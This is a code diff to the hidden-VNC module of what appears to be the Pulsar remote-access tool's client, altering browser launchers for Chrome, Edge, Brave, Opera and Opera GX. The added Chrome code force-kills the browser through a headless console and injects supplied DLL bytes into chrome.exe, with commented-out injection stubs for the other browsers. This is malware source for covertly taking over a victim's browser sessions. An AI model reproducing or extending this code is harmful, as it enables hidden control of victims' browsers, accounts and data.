@@ -137,7 +137,7 @@ namespace Pulsar.Client.Helper.HVNC
             }
         }
 
-        public void StartBrave()
+        public void StartBrave(byte[] dllbytes)
         {
             try
             {
@@ -151,6 +151,17 @@ namespace Pulsar.Client.Helper.HVNC
                 string filePath = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
                 this.CreateProc(filePath);
 
+                //string braveEXEPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+                //if (File.Exists(braveEXEPath))
+                //{
+                //    KDOTInjection.HVNCInjection(braveEXEPath, dllbytes);
+                //}
+                //else
+                //{
+                //    Debug.WriteLine("Brave executable not found.");
+                //    return;
+                //}
+
                 PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application", "\\BraveSoftware", "chrome.dll");
                 patcher.Start();
             }
@@ -160,7 +171,7 @@ namespace Pulsar.Client.Helper.HVNC
             }
         }
 
-        public void StartOpera()
+        public void StartOpera(byte[] dllbytes)
         {
             try
             {
@@ -180,11 +191,22 @@ namespace Pulsar.Client.Helper.HVNC
                 else
                 {
                     DeleteFolder(text);
-                    this.StartOpera();
+                    this.StartOpera(dllbytes);
                     return;
                 }
 
                 string operaEXEPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Programs\\Opera\\opera.exe";
+
+                //Inject before patching
+                //if (File.Exists(operaEXEPath) && dllbytes != null && dllbytes.Length > 0)
+                //{
+                //    KDOTInjection.HVNCInjection(operaEXEPath, dllbytes);
+                //}
+                //else
+                //{
+                //    Debug.WriteLine("Opera executable not found or DLL bytes missing.");
+                //    return;
+                //}
 
                 string startCommand = "Conhost --headless cmd.exe /c start \"\" " + $"\"{operaEXEPath}\"" + " --user-data-dir=\"" + text + "\"";
                 this.CreateProc(startCommand);
@@ -202,7 +224,7 @@ namespace Pulsar.Client.Helper.HVNC
             }
         }
 
-        public void StartOperaGX()
+        public void StartOperaGX(byte[] dllbytes)
         {
             try
             {
@@ -222,11 +244,22 @@ namespace Pulsar.Client.Helper.HVNC
                 else
                 {
                     DeleteFolder(text);
-                    this.StartOperaGX();
+                    this.StartOperaGX(dllbytes);
                     return;
                 }
 
                 string operaGXEXEPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Programs\\Opera GX\\opera.exe";
+
+                //Inject before patching
+                //if (File.Exists(operaGXEXEPath) && dllbytes != null && dllbytes.Length > 0)
+                //{
+                //    KDOTInjection.HVNCInjection(operaGXEXEPath, dllbytes);
+                //}
+                //else
+                //{
+                //    Debug.WriteLine("OperaGX executable not found or DLL bytes missing.");
+                //    return;
+                //}
 
                 string startCommand = "Conhost --headless cmd.exe /c start \"\" " + $"\"{operaGXEXEPath}\"" + " --user-data-dir=\"" + text + "\"";
                 Debug.WriteLine(startCommand);
@@ -244,7 +277,7 @@ namespace Pulsar.Client.Helper.HVNC
             }
         }
 
-        public void StartEdge()
+        public void StartEdge(byte[] dllbytes)
         {
             try
             {
@@ -262,6 +295,16 @@ namespace Pulsar.Client.Helper.HVNC
                 string edgeExe = programFiles + "\\Microsoft\\Edge\\Application\\msedge.exe";
                 string edgeAppDir = programFiles + "\\Microsoft\\Edge\\Application";
 
+                //if (File.Exists(edgeExe) && dllbytes != null && dllbytes.Length > 0)
+                //{
+                //    KDOTInjection.HVNCInjection(edgeExe, dllbytes);
+                //}
+                //else
+                //{
+                //    Debug.WriteLine("Edge executable not found or DLL bytes missing.");
+                //    return;
+                //}
+
                 PrinterPatcher patcher = new PrinterPatcher(edgeExe, edgeAppDir, "\\Microsoft\\Edge", "msedge.dll");
                 patcher.Start();
             }
@@ -271,7 +314,7 @@ namespace Pulsar.Client.Helper.HVNC
             }
         }
 
-        public void Startchrome()
+        public void Startchrome(byte[] dllbytes)
         {
             try
             {
@@ -282,30 +325,44 @@ namespace Pulsar.Client.Helper.HVNC
                     return;
                 }
 
-                //string sourceDir = Path.Combine(path, "User Data");
-                //string text = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "\\FakeAppData");
+                string sourceDir = Path.Combine(path, "User Data");
+
                 string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
                 this.CreateProc(filePath);
-                //if (!Directory.Exists(text))
-                //{
-                //    Directory.CreateDirectory(text);
-                //    this.CreateProc(filePath);
-                //    this.CloneDirectory(sourceDir, text);
-                //}
-                //else
-                //{
-                //    DeleteFolder(text);
-                //    this.Startchrome();
-                //}
 
-                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application", "\\Google", "chrome.dll");
-                patcher.Start();
+                //TODO: CHANGE TO WATCHING FOR THE CREATPROC ABOVE TO END INSTEAD OF A FIXED SLEEP
+                Thread.Sleep(500);
+
+                string chromeEXEPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe";
+                string chromeEXEPath32 = Environment.GetEnvironmentVariable("PROGRAMFILES(X86)") + "\\Google\\Chrome\\Application\\chrome.exe";
+                
+
+                if (File.Exists(chromeEXEPath))
+                {
+                    KDOTInjection.HVNCInjection(chromeEXEPath, dllbytes);
+                    Debug.WriteLine("Injected into 64-bit Chrome.");
+                }
+                else if (File.Exists(chromeEXEPath32))
+                {
+                    KDOTInjection.HVNCInjection(chromeEXEPath32, dllbytes);
+                    Debug.WriteLine("Injected into 32-bit Chrome.");
+                }
+                else
+                {
+                    Debug.WriteLine("Chrome executable not found.");
+                    return;
+                }
+
+                
             }
             catch (Exception ex)
             {
                 Debug.WriteLine("Error starting Chrome: " + ex.Message);
                 return;
             }
+
+            Debug.WriteLine("Chrome started successfully.");
+
             return;
         }
 
